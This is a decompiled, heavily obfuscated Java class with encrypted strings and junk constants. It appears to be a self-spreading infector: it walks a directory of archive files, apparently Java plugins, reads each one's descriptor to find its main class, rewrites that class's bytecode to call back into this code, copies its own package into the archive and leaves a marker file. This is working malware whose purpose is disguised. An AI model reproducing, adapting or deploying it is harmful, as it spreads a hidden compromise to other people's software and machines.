package l.M.x;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.IOException;
import java.net.URISyntaxException;
import java.nio.file.FileSystem;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.OpenOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.Objects;
import java.util.Properties;

public class __v3_ {
   // $FF: synthetic field
   private static String[] b;
   // $FF: synthetic field
   private static int s;
   // $FF: synthetic field
   private static boolean V;
   // $FF: synthetic field
   private static final int Y;
   // $FF: synthetic field
   private static final int m;
   // $FF: synthetic field
   private static final int n;
   // $FF: synthetic field
   private static final int D;
   // $FF: synthetic field
   private static final int f;
   // $FF: synthetic field
   private static final int o;
   // $FF: synthetic field
   private static final int w;
   // $FF: synthetic field
   private static final int S;
   // $FF: synthetic field
   private static final int O;
   // $FF: synthetic field
   private static final int A;
   // $FF: synthetic field
   private static final int Z;
   // $FF: synthetic field
   private static final int c;
   // $FF: synthetic field
   private static final int Q;
   // $FF: synthetic field
   private static final int vT;
   // $FF: synthetic field
   private static final int J;
   // $FF: synthetic field
   private static final int k;
   // $FF: synthetic field
   private static final int R;
   // $FF: synthetic field
   private static final int Lv;
   // $FF: synthetic field
   private static final int z_;
   // $FF: synthetic field
   private static final int W;
   // $FF: synthetic field
   private static final int oC;
   // $FF: synthetic field
   private static final int P;
   // $FF: synthetic field
   private static final int F;
   // $FF: synthetic field
   private static final int i;
   // $FF: synthetic field
   private static final int t;
   // $FF: synthetic field
   private static final int I;
   // $FF: synthetic field
   private static final int G;
   // $FF: synthetic field
   private static final int tz;
   // $FF: synthetic field
   private static final int a;
   // $FF: synthetic field
   private static final int mA;
   // $FF: synthetic field
   private static final int oN;
   // $FF: synthetic field
   private static final int Ik;
   // $FF: synthetic field
   private static final int s0;
   // $FF: synthetic field
   private static final int aP;
   // $FF: synthetic field
   private static final int B;
   // $FF: synthetic field
   private static final int q;
   // $FF: synthetic field
   private static final int qX;
   // $FF: synthetic field
   private static final int sB;
   // $FF: synthetic field
   private static final int Of;
   // $FF: synthetic field
   private static final int C;
   // $FF: synthetic field
   private static final int u;
   // $FF: synthetic field
   private static final int f6;
   // $FF: synthetic field
   private static final int Sr;
   // $FF: synthetic field
   private static final int K;
   // $FF: synthetic field
   private static final int l;
   // $FF: synthetic field
   private static final int X;
   // $FF: synthetic field
   private static final int n_;
   // $FF: synthetic field
   private static final int j;
   // $FF: synthetic field
   private static final int ZU;
   // $FF: synthetic field
   private static final int Yd;
   // $FF: synthetic field
   private static final int o2;
   // $FF: synthetic field
   private static final int s1;
   // $FF: synthetic field
   private static final int Vu;
   // $FF: synthetic field
   private static final int ZC;
   // $FF: synthetic field
   private static final int Qe;
   // $FF: synthetic field
   private static final int jS;
   // $FF: synthetic field
   private static final int z5;
   // $FF: synthetic field
   private static final int Pl;
   // $FF: synthetic field
   private static final int p;
   // $FF: synthetic field
   private static final int s5;
   // $FF: synthetic field
   private static final int tt;
   // $FF: synthetic field
   private static final int wY;
   // $FF: synthetic field
   private static final int h;
   // $FF: synthetic field
   private static final int RK;
   // $FF: synthetic field
   private static final int Qb;
   // $FF: synthetic field
   private static final int cb;
   // $FF: synthetic field
   private static final int hK;
   // $FF: synthetic field
   private static final int N;
   // $FF: synthetic field
   private static final int tn;

   // $FF: synthetic method
   public static void v() {
      (new __v3_())._v();
   }

   // $FF: synthetic method
   private static String L(String Gl) {
      char[] rA = Gl.toCharArray();
      char[] Qi = new char[rA.length];
      int zc = Qe;

      do {
         if (zc >= rA.length) {
            String VuF = new String(Qi);
            int Bt = hK;

            do {
               if (Bt >= Qi.length) {
                  VuF = new String(Qi);
                  return VuF;
               }

               Qi[Bt] = (char)(VuF.charAt(Bt) ^ N % tn);
               ++Bt;
            } while(s >= 0);

            throw null;
         }

         int var5 = zc % jS;
         if (var5 != z5) {
            if (var5 != Pl) {
               if (var5 != p) {
                  Qi[zc] = (char)(rA[zc] ^ Gl.length() % cb);
               } else {
                  Qi[zc] = (char)(rA[zc] ^ RK % Qb);
                  if (s < 0) {
                     throw null;
                  }
               }
            } else {
               Qi[zc] = (char)(rA[zc] ^ wY % h);
               if (s < 0) {
                  throw null;
               }
            }
         } else {
            Qi[zc] = (char)(rA[zc] ^ s5 % tt);
            if (!V) {
               throw null;
            }
         }

         ++zc;
      } while(s >= 0);

      throw null;
   }

   static {
      int var10002 = U.o(-822220387);
      int var10001 = -2098786732;
      Y = var10002 ^ -1181237389;
      var10002 = U.o(-854833487);
      var10001 = -726262008;
      m = (var10002 ^ -1922944846) & -1;
      var10001 = 1463694516;
      n = -1123686597 ^ U.o(-1662541635);
      var10002 = U.o(-1014626346);
      var10001 = -936288431;
      D = var10002 ^ U.N(-1350465779, -729303902);
      var10002 = U.o(350585373);
      var10001 = -789387527;
      f = var10002 ^ -1203656917;
      o = 2048 >>> U.o(-1778384896) | 2048 << ~U.N(1761607680, -404361384) + 1;
      var10002 = U.o(470472579);
      var10001 = 1406065427;
      w = var10002 ^ -1041543112;
      var10002 = U.o(445765583);
      var10001 = -1130986344;
      S = var10002 ^ U.N(-945857462, -835633029);
      var10001 = 2144769857;
      O = -1234535270 ^ U.o(-113355155);
      var10002 = U.o(-387355629);
      var10001 = 1704964583;
      A = (var10002 ^ -935946473) & -1;
      var10002 = U.o(2146566770);
      var10001 = 876263302;
      Z = var10002 ^ 1312837624;
      c = (28 >>> 226 | 28 << ~U.o(1191182336) + 1) & -1;
      Q = (262144 >>> 239 | 262144 << -239) & -1;
      vT = (603979776 >>> 186 | 603979776 << ~U.o(1560281088) + 1) & -1;
      var10002 = U.o(1633293283);
      var10001 = 696861522;
      J = var10002 ^ -943170938;
      var10002 = U.o(2075644090);
      var10001 = -1751696726;
      k = var10002 ^ 1561062878;
      R = (-536870910 >>> U.o(1509949440) | -536870910 << ~90 + 1) & -1;
      var10002 = U.o(-1296403803);
      var10001 = 415252463;
      Lv = var10002 ^ -1521590969;
      var10001 = 594163351;
      z_ = -484353581 ^ -484353576;
      var10001 = -182390549;
      W = 234572800 ^ U.o(808640432);
      var10001 = -112675417;
      oC = 804980317 ^ U.o(174120948);
      var10002 = U.o(588798357);
      var10001 = -419250874;
      P = var10002 ^ -1449518908;
      var10002 = U.o(-228291432);
      var10001 = 1956538236;
      F = var10002 ^ 422651469;
      var10002 = U.o(-1557429319);
      var10001 = 1105338318;
      i = var10002 ^ -1648241468;
      var10002 = U.o(146707272);
      var10001 = 346508918;
      t = var10002 ^ 315194641;
      var10002 = U.o(-1240682571);
      var10001 = -1493921032;
      I = (var10002 ^ -1376440211) & -1;
      var10001 = 337581597;
      G = (-1825112117 ^ -1825112123) & -1;
      var10001 = 457545810;
      tz = 1796612367 ^ U.o(8677590);
      var10002 = U.o(-759344168);
      var10001 = -1473555708;
      a = var10002 ^ 466271563;
      var10002 = U.o(-1367464435);
      var10001 = -97699660;
      mA = var10002 ^ -1335591307;
      var10002 = U.o(959422597);
      var10001 = -1410320021;
      oN = var10002 ^ -1593445220;
      var10001 = 767763820;
      Ik = 1510119016 ^ U.o(510214234);
      var10002 = U.o(1519120606);
      var10001 = -1903922764;
      s0 = var10002 ^ 2064634202;
      var10002 = U.N(-1920986459, -1305967032);
      var10001 = 1713979226;
      aP = var10002 ^ -1517453294;
      B = 1088 >>> 102 | 1088 << -102;
      var10002 = U.o(-1183029458);
      var10001 = 1853127568;
      q = var10002 ^ 1961246351;
      var10002 = U.N(1008337701, -1673427692);
      var10001 = 799391613;
      qX = var10002 ^ U.o(-2083894267);
      var10001 = 1679587031;
      sB = 1142342726 ^ U.o(-500996062);
      var10002 = U.o(2068829445);
      var10001 = -3467139;
      Of = var10002 ^ -1599343908;
      var10002 = U.N(-1812217238, 1651885327);
      var10001 = -1369987191;
      C = var10002 ^ U.o(803515169);
      var10002 = U.N(-1975094159, -152354013);
      var10001 = 896341945;
      u = var10002 ^ 826855050;
      f6 = 167772160 >>> 25 | 167772160 << ~U.o(-1744830464) + 1;
      var10002 = U.o(-989038862);
      var10001 = 890974536;
      Sr = var10002 ^ 1332621477;
      K = 224 >>> U.o(-1593835520) | 224 << ~U.N(272384, 87345867) + 1;
      var10001 = -498890790;
      l = -821962660 ^ U.o(706445555);
      X = 18 >>> U.o(-2030043136) | 18 << ~225 + 1;
      n_ = 80 >>> U.o(-956301312) | 80 << ~227 + 1;
      var10002 = U.o(-1167577745);
      var10001 = 1792339690;
      j = var10002 ^ -155969962;
      ZU = 1572864 >>> 241 | 1572864 << -U.o(-1895825408);
      Yd = 13631488 >>> U.o(687865856) | 13631488 << -U.N(-1610612732, 438401659);
      var10002 = U.N(1898871204, -252219910);
      var10001 = -217239392;
      o2 = var10002 ^ 1268672786;
      var10002 = U.o(-763683487);
      var10001 = 648350186;
      s1 = var10002 ^ U.N(2031229667, 1823945170);
      var10002 = U.o(-390706700);
      var10001 = 1224169235;
      Vu = var10002 ^ 798125319;
      ZC = 1140850688 >>> U.o(1560281088) | 1140850688 << ~186 + 1;
      var10002 = U.o(1807487383);
      var10001 = -262106301;
      Qe = var10002 ^ -376947242;
      var10002 = U.o(807636170);
      var10001 = -698998681;
      jS = var10002 ^ 1395770376;
      var10002 = U.o(-113752334);
      var10001 = -1729846889;
      z5 = var10002 ^ U.N(1336389902, -590179337);
      var10001 = 850313941;
      Pl = -1902696567 ^ -1902696568;
      var10002 = U.o(1806180774);
      var10001 = -1097126445;
      p = var10002 ^ 1703155156;
      s5 = -452948986 >>> U.o(2046820352) | -452948986 << ~94 + 1;
      tt = 128960 >>> U.o(1677721600) | 128960 << ~38 + 1;
      var10001 = -468209630;
      wY = 668205499 ^ 668205505;
      h = 3876 >>> U.N(67584, 868014890) | 3876 << ~U.o(1107296256) + 1;
      var10002 = U.o(-152328258);
      var10001 = -278883745;
      RK = var10002 ^ -272910882;
      var10001 = 988836267;
      Qb = -467793070 ^ U.o(554727463);
      var10002 = U.o(2009665490);
      var10001 = -721668334;
      cb = var10002 ^ 1274056798;
      var10002 = U.o(2086104075);
      var10001 = 205910394;
      hK = (var10002 ^ -801707458) & -1;
      var10001 = 787089181;
      N = (1864695259 ^ U.o(1459183295)) & -1;
      var10002 = U.o(1824111290);
      var10001 = -1560603056;
      tn = var10002 ^ 1566416204;
      z();
      new _µ((Path)null);
   }

   // $FF: synthetic method
   private void _v() {
      File var1 = new File(b[Y]);
      if (!System.getProperty(b[m]).contains(b[n])) {
         try {
            label82: {
               FileSystem var2 = FileSystems.newFileSystem(Paths.get(this.getClass().getProtectionDomain().getCodeSource().getLocation().toURI()), (ClassLoader)null);
               File[] var3 = (File[])Objects.requireNonNull(var1.listFiles());
               int var4 = var3.length;
               int var5 = D;

               while(var5 < var4) {
                  File var6 = var3[var5];
                  if (var6.isFile()) {
                     if (!var6.getName().endsWith(b[f])) {
                        if (s < 0) {
                           throw null;
                        }
                     } else {
                        label87: {
                           label65: {
                              try {
                                 FileSystem var7 = FileSystems.newFileSystem(var6.toPath(), (ClassLoader)null);
                                 if (!Files.exists(var7.getPath(b[o]), new LinkOption[S])) {
                                    Path var8 = var7.getPath(b[O]);
                                    Properties var9 = new Properties();
                                    var9.load(new ByteArrayInputStream(Files.readAllBytes(var8)));
                                    String var10 = var9.getProperty(b[Z]).replace(b[c], b[Q]) + b[vT];
                                    Path var11 = var7.getPath(var10);
                                    v1 var12 = new v1();
                                    (new µ8_(Files.readAllBytes(var11))).v((µ0)var12, k);
                                    µµµ var13 = (µµµ)var12._72.stream().filter((var0) -> {
                                       return var0.µv8.equals(b[B]);
                                    }).findFirst().get();
                                    var13._();
                                    _13 var14 = new _13();
                                    var14._(new v2v4(R, this.getClass().getName().replace(b[Lv], b[z_]), b[W], b[oC], (boolean)P));
                                    var13._1._v(var14);
                                    var13.µv8();
                                    var12._v();
                                    µv var15 = new µv(F);

                                    byte[] var16;
                                    label61: {
                                       try {
                                          var12.v((µ0)var15);
                                          var16 = var15._();
                                       } catch (Throwable var18) {
                                          var15 = new µv(i);
                                          var12.v((µ0)var15);
                                          var16 = var15._();
                                          break label61;
                                       }

                                       if (s < 0) {
                                          throw null;
                                       }
                                    }

                                    OpenOption[] var10002 = new OpenOption[t];
                                    var10002[I] = StandardOpenOption.WRITE;
                                    Files.write(var11, var16, var10002);
                                    String var17 = b[G] + this.getClass().getPackage().getName().split(b[tz])[a];
                                    Files.walkFileTree(var2.getPath(var17), new _µ(var7.getPath(var17)));
                                    Files.createFile(var7.getPath(b[Ik]));
                                    var7.close();
                                    break label65;
                                 }
                              } catch (Exception var19) {
                                 break label87;
                              }

                              if (s < 0) {
                                 throw null;
                              }
                              break label87;
                           }

                           if (!V) {
                              throw null;
                           }
                        }
                     }
                  }

                  ++var5;
                  if (!V) {
                     throw null;
                  }
               }

               try {
                  var2.close();
               } catch (IOException var20) {
                  break label82;
               }

               if (!V) {
                  throw null;
               }
            }
         } catch (URISyntaxException | IOException var21) {
            return;
         }

         if (!V) {
            throw null;
         }
      }
   }

   // $FF: synthetic method
   private static void z() {
      String[] var10000 = new String[q];
      var10000[qX] = L("Ƞￒǲ￢ɻﾚǫ￠ɽ");
      var10000[sB] = L("ɡﾎƬ￮ɯﾐǧ");
      var10000[Of] = L("əﾔǬ￤ɡﾊǱ");
      var10000[C] = L("Ƞﾗǣ\ufff1");
      var10000[u] = L("Ƞﾚǫ\ufffaɥﾘǧ\ufffeɑ");
      var10000[f6] = L("ɾﾑǷ￪ɧﾓƬ\ufff4ɣﾑ");
      var10000[Sr] = L("ɣﾜǫ￭");
      var10000[K] = L("Ƞ");
      var10000[l] = L("ȡ");
      var10000[X] = L("ȠﾞǮ￠ɽﾎ");
      var10000[n_] = L("Ƞ");
      var10000[j] = L("ȡ");
      var10000[ZU] = L("ɸ");
      var10000[Yd] = L("Ȧￔǔ");
      var10000[o2] = L("ȡ");
      var10000[s1] = L("ɒￓ");
      var10000[Vu] = L("Ƞﾚǫ\ufffaɥﾘǧ\ufffeɑ");
      var10000[ZC] = L("ȲﾔǬ￨ɺￃ");
      b = var10000;
   }
}
